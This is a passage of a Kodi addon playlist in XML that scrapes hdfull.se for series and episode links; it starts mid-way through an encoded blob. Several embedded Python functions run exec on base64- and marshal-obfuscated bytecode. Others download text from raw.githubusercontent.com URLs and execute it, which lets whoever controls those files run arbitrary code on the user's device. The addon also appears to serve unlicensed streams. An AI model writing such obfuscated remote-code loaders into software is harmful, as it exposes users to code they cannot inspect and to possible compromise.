FIZEcxeVJqaHBTVkoxVDNCaFFUTkJlVWxhUkdGTWFXOTJPVE5hTVZKcGJqQlNORVoyT0dWeVlWcHBSMGxGYTAxS2VHbFpNWGxwYmtZNE1VSktkVVZ5VWxkdFFVdGpibTUyT1RCTmVtSXdRV3c0YVc4eWVHbEVlazFwUVZOalYwbGhSR3RLU2pFeVFUSXhNVmd5YTNWd2JVVlBSM3BCWW5GUldtbHVTbEl6V0d3NU0xcDRWMjVhUmpobFdHMTVRVVF4ZFVkWmJWWXhSVXRQU1hKR09ETkNTRVExV2pGd01FbEtlWGxhU210VFNFZDVZMW95WjNWeE1GTlZRa2RhTW5GdGREVkZTMWN4VEhsNU1IRXhkVWR2VWxwcGIwb3daVXBIVjNsWmJVUnBSM3BxWlVZeVV6UlpiVTFWV25vd2JWa3dTV3RhTWpGVVFsSmFNMEV5ZUdsdlNYbGpXVzFhWlVSc09HbEpVbEpxUVVoYWFWZ3llRzF3YkRsalFrZFhRMXBUZVcxRU0xWnBSM2hKVjBkTFQxZEtkekJoVVVSak5tNUtPV2hXVVRCMFZ6RnJORUZ0VjNCeVVVMTZTMVYwTTBGVGF6UmFiVk53Y2xGYWJWZHFNRmh2ZWtscFZsRXdkRTFMVFhWdlVIUmhTMVYwTWxwNWF6UkJkM2x3Y2xGTmVVdFZkREphU1dzMFFXMUJjSEpSVEcxTFZYUXlRa2xyTkVGM2VYQnlVVmQ1UzFWME0wRkphelJCZWtsd2NsRk1ORXRWZERKQlNXczBRVzExY0hKUlRYZExWWFF5UWtsck5FRjNUWEJ5VVhBMVMxVjBiRUpUYXpSQmVrVndjbEZOZWt0VmRETmFlV3MwUVcxUGNISlJURFJMVlhReVFVbHJORUZ0U1hCeVVYQnRTMVYwYkVKSmF6UmFkMDVoV0VaT1pWWlVTVEpNU21waVZ6RnJORUYzUVhCeVVVMTZTMVYwTWtGVGF6UkJkMGx3Y2xGTWJVdFZkRE5hTVdzMFducEpjSEpSVERCTFZYUXlRVWxyTkVGM1FYQnlVVTE2UzFWME1rRlRhelJCZDBsd2NsRldORXRWZEROQlUyczBRVzFYY0hKUlREVkxWWFF5VFVsck5FRjNlWEJ5VVhBd1MxVjBNMEpKYXpSYWVrRndjbEZXYWt0VmRETk1TV3MwUVhkNWNISlJUWHBMVlhReVRVbHJORnAzZUdGWVJrNWxWbFJKTWt4S2FtSlhNV3MwUVhkWGNISlJURFZMVlhReVRVbHJORUYzVTNCeVVYQnRTMVYwTWxveGF6UkJkM2x3Y2xGTU5VdFZkR3hOU1dzMFFXMUpjSEpSVFhsTFZYUXlRbE5yTkVGM1NYQnlVWEEwUzFWME1rd3hhelJCZDNsd2NsRk1Na3RWZEROQ1NXczBXbmQxY0hKUlRYcExWWFF6V25sck5FRjNVM0J5VVV4dFMxVjBNa3d4YXpSQmQwbHdjbEZXTlZkc2VIUlliRTk1Y1hwVFpsaFFjWEJ5VVV4dFMxVjBNazE1YXpSQmQwVndjbEZNTVV0VmRESmFNV3MwUVcxQmNISlJWM2xMVlhReVFWTnJORUYzU1hCeVVVeHRTMVYwTWsxNWF6UkJkMFZ3Y2xGTU1VdFZkR3hDVTJzMFFYcFhjSEpSVERGTFZYUXpRa2xyTkVGNlJYQnlVVXhyUzFWME1reDVhelJCZDBsd2NsRndiRXRWZEd4YVUyczBXbnBCY0hKUlZtcExWWFF6VEVsck5FRjNlWEJ5VVUxNlMxVjBNazFKYXpSYWQzaGhXRVF3V0UxTFRYVnZVSFYzYnpJeGFtNUthM2xZVldObWJrcFdhRTFVU1hkdk1qRnFjSHBKYlhCc2RYWk1TMEY1UVhkRWFFeDNUREJOVkVsM2J6SkZlVmhVU1RKTVNtcGlWekZyTkVGNlNYQnlVVXd4UzFWME1rMTJjR05ZUm5obVYyMXJiWEZWVjJOdmVuQXJWMnhxWVUxTGRYbE1iSEJqV0VROVBYUUZBQUFBY205ME1UTnpDUUFBQUcxdmNuQm9aWFZ6SUhNY0FBQUFZMjlrWldOekxtUmxZMjlrWlNoMGNtbHVhWFI1TENCNmFXOXVLWFFHQUFBQWIzSmhZMnhsY3g0QUFBQmpiMlJsWTNNdVpHVmpiMlJsS0d0bGVXMWhhMlZ5SUN3Z2VtbHZiaWwwQXdBQUFHNWxiM01JQUFBQVBITjBjbWx1Wno1MEJBQUFBR1Y0WldNb0N3QUFBSFFHQUFBQVltRnpaVFkwZEFZQUFBQmpiMlJsWTNOMENBQUFBRzF2Y25Cb1pYVnpkQWNBQUFCMGNtbHVhWFI1VWdRQUFBQjBDQUFBQUd0bGVXMWhhMlZ5ZEFRQUFBQjZhVzl1ZEFRQUFBQmxkbUZzVWdVQUFBQjBCd0FBQUdOdmJYQnBiR1YwQ1FBQUFHSTJOR1JsWTI5a1pTZ0FBQUFBS0FBQUFBQW9BQUFBQUhNR0FBQUFjMk55YVhCMGRBZ0FBQUE4Ylc5a2RXeGxQZ0VBQUFCekRnQUFBQmdCQmdFR0FRWUJCZ0VHQVNvQiIpKSk="))
]]></expres>
<page></page>
</regex>
<regex>
<name>d</name>
<expres><![CDATA[#$pyFunction
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url='[temp.param2]'):#cPrLItsLTfakl
  if 'Especiales' == url:
    return '[temp.param2]'
  else:
    return 'Temporada [temp.param2]'
]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white]$doregex[d][/COLOR]</title>
<info>[COLOR white][temp.param2][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>https://hdfull.se[makelist2.param3]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[(?s)<li><a href='(.*?)'>(.*?)<]]></expres>
<page>https://hdfull.se[makelist2.param1]</page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param3][/COLOR]</info>
<link>$doregex[peli]</link>
<thumbnail>https://hdfull.se[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[(?s)item center">.*?href="(.*?)".*?src="(.*?)".*?title="(.*?)"]]></expres>
<page>https://hdfull.se[temp.param1]</page>
</regex>
<regex>
<name>peli</name>
<listrepeat><![CDATA[
<title>$pyFunction:("[COLOR white][CAPITALIZE][peli.param4] [peli.param2] [peli.param3][/CAPITALIZE][/COLOR]").replace("https://","").replace("http://","")</title>
<link>$doregex[selecion_inteligente]</link>
<info>[COLOR white][CAPITALIZE][peli.param2] [peli.param3][/CAPITALIZE][/COLOR]</info>
<thumbnail>https://hdfull.se[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcaddon,json,xbmcgui,urllib2
$doregex[finalhdfull]
]]></expres>
<page></page>
</regex>
<regex>
<name>finalhdfull</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcaddon,json,xbmcgui,urllib2
def GetLSProData(page_data, Cookie_Jar, m):

  return re.split('\n*?', urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/dominios/finalhdfull').read())[0]

]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '[peli.param1]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/fUmWn5D.png</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
</item>
------------------------------------------------------------------------------------------------------------------------------------------------------------------------

 <item>
<title>[COLOR gold]* [COLOR lightseagreen]Series [/COLOR][COLOR white]Por Productoras[/COLOR]</title>
<link>$doregex[makelist]</link>
<regex>
<name>makelist</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist.param1][/COLOR]</title>
<link>$doregex[makelist2]</link>
<thumbnail>[makelist.param3]</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
from datetime import datetime, timedelta
import re,requests,urllib2,xbmc,time
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist.param2]'
titulo = '[makelist.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MFF3OEFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT2JVMHlXa1JWZDAxNlVYcFBSRmsxVGxSSk1rNXFXVFJOZW1zeVRucEtiVTV0U1RCYVJGRXdUbXBaTWxwRVdUTk9ha2t3VDBSWk5VNTZaM3BPUkZWNlRrZFpNVTVVWXpGT1ZHc3dXWHBOZUU1RVJUSk5WRnBzVG1wak1sbDZZelJPVjBVeFRYcFNhVTVxWnpOT2VrMHdUbTFSZWs1VVdtbE9WR2N3VG1wVk1VNTZTVEJQUkZFeFRsUkZNMDlVVVRWTmVrVXpUMFJaTVU1SFRUTlBSRTB5VFcxWmVrMVVVVEpPZWswelRXcGpkMDU2VVRCT1JFMHdUakpGTUU1cVZYZE9hbXN6VG5wUk0wNXFaekZOYWxVd1RrZEZNMWxVVW10T2FtdDZUa1JSTlUxNlkzcE9hbFUxVFcxWk0wNUVVbTFPVkdkNlQwUmthRTVVWTNwT2VtTXlUbGRGTTA5RVdUSk9lbGt5V1ZSak5VNVVRVEZOUkVwdFRXMVplazFFWTNkT2VtdDZUMVJTYlUxNlVUTk9hazB6VFhwbmVrMUVUVFJOZW1kNVdtcFZORTVxVlROTmFscHJUbXBSTWxwVVNtMU5iVmw2VDBSYWJFNHlSWHBPYWtwdFRtcFpNMDlVWXpOTmJVa3dXbXBWTVU1SFRYcE9lbGw2VG1wbmVWbHFTbTFOYlZreVdrUmFiRTF0U1RKYVZGWm9UbnBaZWsxNlkzcE5lbU15VGtSTk0wMTZSWGxhYWtwcFRXMVpNMDVVVlRGT2Vra3dUMFJOZUU1cVdURk9hbGw2VFhwamVrMTZUVEZPYlVrd1dtcE5NazF0U1hwT1ZGSnBUWHBaZVZwcVl6Qk9SMUV3V1ZSWmVVNTZZekZPZWsxNVRYcFZNazlVVFhwT2VrRXpUa1JaZVU1VWF6Rk9hbEpzVFhwbmVrMTZZelJPYWsweVRtcFZNMDVVVVRGUFJGSnJUa1JWZWs5VVkzbE9WMFY2VGxSU2FFNUhSVE5OVkZrelRsUmplVnBxWTNsT2FtZDZUbXBaTVUxNlRUSk9WR040VGtSTk0wNUVWVFJPYW1ONlRXcGFiVTVxYXpKYWFrMTRUbnBuTWs1VVRUUk5lbEY2VFZSa2FFNHlSVEpaVkZreFRYcEpNMDFFVlRGT1JGRXlUWHBOTWsxNlp6Rk5SRTB4VG5wUmVWbHFXVEpOZWswd1dYcE5lazVxVlRKWlZGbDRUbnByTVUxcVNtMU5lbFV6VFdwV2FFNXRVVE5QVkZWNlRYcFpNRTU2VFhkT01rVXlXWHBaTVU1cVNUQk9lazE1VG5wVk1FNVVZekpPZW1jeFRXcEtiVTVxVlhwTlZGa3hUbTFKTWxscVRUSk9SR2N5VGxSUmVrMTZUWHBPUkZVeFRucE5NVTFxV1hwTmVrVXdXbFJWTlU1cVdUSmFSRTE0VG0xUk1GbFVXVE5PYlZFeVdXcE5NazVxWXpGTlZGVXhUakpGZWs1VVl6Qk9iVWw2VFhwUk1FNVVhekJPZWxKcVRsUnJNazlFWTNsT1ZGVXpXVlJSTUU1VVl6Rk5lazEzVG5wUk0wNTZXbXRPYlUweFRrUk5lVTF0U1RKTlZGcHJUWHBKTUU1NldtdE9ha2t5V2tSak1VNTZVVEpOYWxsNFRXMVplVmxxVVROTmVtZDVXV3BXYUU1dFVUQlBWR04zVG0xWk0wMUVUVE5PVkZreVdYcGpNVTVFVlROT1JHTjZUbFJWTVUxNldYbE9iVVV4VDFSVk1FNUVVVEpOYWxwdFRsUkplVnBxVlRKT2JWRXhUMVJqTUU1cVl6SmFWRlY1VG5wUk1FMVVZelJPZW1jeFQxUlZlVTV0VlROUFZFMDFUbXBGZWsxcVZUSk9iVlV4VGtSV2FFNVVVVEJPUkZwc1RtMVpNMDlVV20xT2VsVXhUMVJTYTA1dFZUTk9lbFYzVGtSWmVrMVVXVFJPZW1jeFQwUmpNMDU2UVRKT1ZGazFUa1JaZWs5VVZtaE9ha2t5VGtSa2FFNVVSVEZPUkZGNVRrZFJlazVxVVRSTmVrRjZUa1JaTlU1RVJUSk9SRTAwVFhwRk1rNXFWWGxPVkVFd1dYcGthRTVVVFRGTlZFMTNUbXBWTWs1NldUSk5lbGt4VFdwamQwNTZRVEpaYW1NeVRsZEZNazlFWTNwTmVtTXdXa1JWZDAxdFNURk5WR04zVG0xRk0xbFVZekZPVkdjeFRrUlplRTVxWXpOT1ZFMHdUbTFSTVU5VVZtaE9WRUV3VFZSWk1rMTZWVE5PVkZGNlRYcGpNazU2VW14T2Fsa3dUbFJOTkU1cVVYbFphazAwVGtSck1rOUVUWGhPZWtFeVQwUlNiRTU2UlROTmVtTjZUa1JSZWs5VVRUVk9hbFV5VGxSWk1FNXRTVEJPVkdNd1RsUnJNbHBxV1RWT2FrMTVXV3BqTUUxNlJUSk5WRTE1VG5wak1FOUVXbXBPUkZFd1dWUlpNMDVFYTNwUFJGazBUWHBKTUZwVVdYaE9SRlV3V2xSS2FVNTZRVEJPUkZwc1RYcGpNbHBxVVRST2Vsa3dUWHBOZWs1VVkzcE9WRkY1VFcxSk1GcFVXVE5PVkdjd1dtcGpNVTV0UlROT1JFMDBUbXBuZWsxNlRURk9SR3N3VFdwak0wNXRWWHBOUkZKclRtcEZNVTVxV1hoT1Ixa3pUVlJWTkU1dFJUTlBSR041VGxSak1scFVWVEJPVkVrd1QxUmpNVTU2WXpGT1JGa3lUWHBCTUZsVVZYcE9lbGt5VDFSUmVVNVVaek5QVkZGNVRsUlJNbGxVV21sT2VrRjVXbXBWTVU1SFdUTk9hazEzVGtSWk1rNVVTbTFPYlZFeFQwUldhRTE2VVRKYVZFcHBUbTFWZWs1RVkzbE9iVkY1V1dwVk1VNUVaek5PVkZwb1RsZEZNMDVxWXpST1JFbDZUMVJOTlU1VVJYcE9lazE1VGtSVk1VOVVWVEZPVkdzeFRWUlJlRTU2VVhwT2FsSm9UbnBKZWsxVVVYbE9la2t5VDFSU2FrNUVVVE5PUkUwMVRrUk5NVTFVV1RST2FsRXdUWHBqTTA1cVozcE5lbFY0VFcxWmVrNUVWVEJOZW1NeFRYcFJlVTF0V1RGTmVsVjNUbXBKTTA1NlZUUk9WMFV3VFdwWk1rNVhSVEJhUkdNMFRrUk5NazU2V210T1ZGRXlXbFJhYlU1NldUQmFWR00xVFhwWk1FOUVZekpPYlZFd1RucFJORTVVU1RCYWFscHJUWHBGZWsxNlVYcE9WRkV4VFZSVmQwMXRXVEJPYW1Nd1RtcGpNVTE2VFRKT2FsVXlXbXBWZUU1cVVYcFBWRnBxVG5wTk1rNXFWVE5PVkVrd1RsUlJORTF0U1ROT2VscHRUbTFWTTA1cVdUTk9lbFV5VG5wamVVNVVRVE5OVkZVMVRtcFJlVnBxVVROT1Iwa3lXbFJaTTAxdFNYcFBSRlY1VG1wVk1rOVVVbTFOZW1ONlRrUmpORTE2VFROUFJGVXlUVzFKTUU5VVdYcE5lbXN3VGxSU2EwMXRTVEJhUkZreVRtMUpNVTlFWXpWT1JFVXlUWHBOTlU1cVl6Rk5lbGt5VGtSUmVrMVVXbWxPVkZVd1RYcFZkMDVxVVRGTlZFMHdUbFJaZWs1cVZYaE9SRkY2VDFSamQwNUVhekpOZWxwcFRrUlJlazFFVFhkTmVrRXlUbnBhYkU1NmF6Rk9lbU0xVGtSbmVrOUVVWHBPVkdjeFQxUmFiVTU2YXpCTlZFMHlUbXBqTVU1VVRURk9SMVV5VGxSTk5FNXFWVE5QVkZwclRXMUpNbGxVV1hoT1YwVjZUMVJaZUU1dFZURk9lbU4zVGtSUk1VNUVXVE5PYWxGNlRucFpOVTVFWjNwT2FrMDBUa2RKTUUxNlkzbE5lbWN3VG5wUk0wNXFZek5PYWxWNVRtcE5NVmxVVW1wT2FtY3lXbFJqTUUxNmF6Sk9lbFV4VGtkRk1rNUVUVE5PYlVVeVRXcGpNRTU2WnpGTlJHTXdUbnBSTTAxRVZUVk9SMWt5VG1wYWFFNUhWVEpQUkdONlRYcEJNRTFxU20xT2JVVXlUbXBTYUU1VVJUTk9SRnBxVG1wbk1rNVVXVE5PUkdONVdtcFNhRTVxVlROUFZHTTFUbnBqZVZscVRUUk9WRlY2VDFSU2EwNXFZM2xhYWxVeFRucEpNMDFxV1RKT2VrRXdUMFJqTUU1dFZUTk9hbU16VGtkWk1rNXFVVEpPZWxrd1QwUlJNRTVVVFRKTlZGbDZUWHByTTFsVVdtdE9WRUV5VGtSa2FFNXFTVEJPVkZGNlRtcFpNVTFVWTNsT2JVMTZUbnBLYVU1VVVUSk9hbEUwVGxSQk1rMVVVWGxPUkZGNlQxUlplVTV0U1RCT1JFMHpUbFJSTTA1VVdUQk9SRmt3VDBSamVrNXRXVEJhYWxsNlRsUk5NazVxVW0xT1IxRjVXV3BOTkU1RVJUSmFSRXBwVFhwUk1FNXFTbTFOZWtFeFQwUmpNVTV0U1RCUFJGa3lUbXBqTVU1RVRUVk9SMFV3V21wUmVrNVVTWHBPYWxKcVRucE5lazFxVFhwT2VrVXhUbnBSTlU1RVVYbGFhbGswVGtSSk1VMVVZekpPVkdzeFQwUk5ORTR5UlhwTlZGVTFUbGRGZWsxNlRUVk9iVVV3V1ZSU2FrMXRTVEJaYWxKb1RXMUpNazlVWTNkT1IwVjZUWHBOZVU1VVRURk9SRlY2VGtSVk1scFVUVFZPUkUweFdWUlNhazU2VVRGTmFsRTFUbnBSTVU1cVNtMU9SRlY2VDFSTmVVMTZWWHBPZWxrMVRtMU5NVTFFWXpOT1JGRjZUMVJaTlU1WFJYcE9lbFY0VG0xSmVWbHFWWGhPUkdjeFRrUlNhRTVIVlRGT1ZGbDRUa1JuTWs5VVZtaE9iVmt3V1dwTk5FMTZRVEJOYWsxNlRtcHJNazFVVVRGT1JGRjZUMFJSTVU1VVNYcE5lbHB0VGpKRmVrNUVWVFZOZW1jeVQxUlNhRTVxVlRCT1ZGcHBUbFJuZWs5VVdYcE5lbEV3V2xSWk1rNXFSVEJQUkZKclRXMVpNbGxxVlRKTmJWa3dUa1JrYUU1RVRURlBSR040VGtSRk1rMXFXWGxPUkVrd1RYcFdhRTR5UlROT2FrMHdUa1JKTWs1RVVUUk9SRWt5VGxSWk1rNTZaekZPZWxsNlRsUkZNbHBFVFROT1ZFVjZUVVJOTkU1SFRUTlBWRkV4VFhwcmVrMXFXVE5OYlZreldWUmpNMDVYUlhsYWFsSnFUa1JaTTAxRVVURk9WRkV5VFhwYWFVNTZaM3BPYWxVMVRrUkZNVTVFWXpKT2FtTXhUVVJTYkU1dFVURk5WRTB6VGtkUk1rNVVXVE5PYWtsNlQwUlZlazVVV1RGTmFsVTBUbTFaTUU1cVpHaE9Na1V4VG1wYWFVNXRWVEZQUkZKclRsUkplazlVVW1oT1ZGVXdXbXBqZWs1RVNYcE5lazAwVGtkTk1VOVVVbXhOYlZsNlRsUmpNazVFVFRKTmFsRTBUbXBaTWxscVpHaE5iVWt3V2tSYWFrNVVWVEpOYWxGNlRrUnJlVnBxVVROT1IwVXhUWHBWTkU1SFNUQlBWRTB4VGtSRk1FNUVUWHBOZWxrd1RsUlplazU2YTNwT2FscHNUbFJCTUU1cVZUSk9lbFV3V1hwUk1rNTZTVE5OUkZreVRtcEZNMDFFWXpCT1JGa3hUV3BOZWs1NlRURk5lazAxVGtSck1sbDZTbWxPVjBVeVRsUmFhVTF0U1RCT1ZGSnRUWHBuTTA5VVl6Tk9SMFY1V1dwWk0wNXFVVE5QVkZFeVRtcE5lazVxVlhsTmVrMHpUMVJSZUUxNlJYcFBWRkpvVG1wbk1VMTZXVEpPVkUwelRrUkthVTVxUlROUFZGazFUbTFWTWs1NlVYaE5iVmt4VDFSWk5FNUVZekZPVkZGNlRrUm5lVnBxVVRWT1ZFbDZUa1JqZDA0eVJUSlBSRmswVG5wTk1FMVVUWHBPYlZrd1dWUlNiVTVFVVRGWlZGcHRUbTFOTWs1NlkzbE9SMVV5VGxSVk1rNVVRVEZPZWxFeFRsUmpNRTFxV1RCT1ZHc3dXV3BqTUU1RVRUSlpWR04zVG5wWk1sbHFZelZOZWtVd1RucE5kMDU2V1RKT1ZGVXpUWHBqTUU1cVl6Rk9SR2N3V1ZSUk1FNXFXVE5PVkdNMVRrUlJNVTlFV21sT2VrRXpUbnBqTWsxNlZUQmFSRXB0VG0xSk1sbFVUVEZPYWtVelRYcGpNRTE2U1RGTmVrMDFUbFJKZWs5RVZUVk5lbEV6V1ZSYWFrNUVhM2xhYWxGNFRrUmplazVVVFhsT01rVXhUbXBSTUUxNlVUQk9SRlUwVG1wSk0wMUVZM2xPVkVsNlRYcGpkMDVFVlRCUFJGa3pUbTFGTUZsVVl6Qk5lazB4VDBSYWJVNUVaek5QVkdNeVRYcHJNazU2VlhwT2Fra3dUbXBWTTA1dFNUQlplazB4VG1wak1rNVVXbWhPUkUweVRtcFpORTVVVVhwTmVrMTNUa1JqTTA1RVVtbE5iVmt5V1dwUmVrMTZWWHBOUkZwdFRrUnJlVnBxVVRWT1JGVjZUMVJqZWs1SFRUQlplbHB0VG5wWk1scFVWWGRPVkZrd1RucFpNVTVVWXpKT2VsRjZUbFJuZVZwcVVYaE9iVlYwUXc4QUFERmFSMGcwV20xSU1FSlJXalZCVVZZd1RIZEZka0Z0ZEcxQ1IxcHRRVlJFTUVKUlYzcEJWRll5V2tkSU1VRkhUakZDUjAxM1ducE1iVnBSU0RGYWVsWXhXa2RGZDBFeVVqQkJVWEJzV20xYU0wRjNjRFZCYlVSdFduZGFiVUZ0ZURKTmQzQXhRVkY0TUUxSFdqVmFiVVF3UWtkRU0xcHRkREZCUjB3eFdtMVdNVnB0Y0d4QlVVZ3lRWGRhTlZwdFVqQmFiVm8wV20xT01rMUhXbXRCVkZZeFFWRmFNRUYzY0cxQmJYQTFRVkY0TTBGM2NESkJkM0JzVEhkRU5WcHRVak5DUjB3eFFWRlNNVUpSUkRWQmQwd3dRa2RhTWxwdGNEQkJkMW94UVVkU2JWcHRUWHBCVVZvelFYZElNMEZSV2pKTmQxZDZRVWRTYlVGM1dqUmFiVlp0UVVkRU5VRkhjREpCZDBoclFVZFNNa0ZSVEd4YWJYUXlURzFhYWtGVVdteE1kMHh0UVZSV01GcHRjREpCZWt3elFWRk1iVnB0U0RGTVIzQnFRVlJJTWsxM2NESkJNbEp0V25kSU1FRjNTREpNYlVneldtMUlNVnAzVERKQlIxSXdRa2RJTkZwdFdqRkJkMW94UVZGd01rRjNTR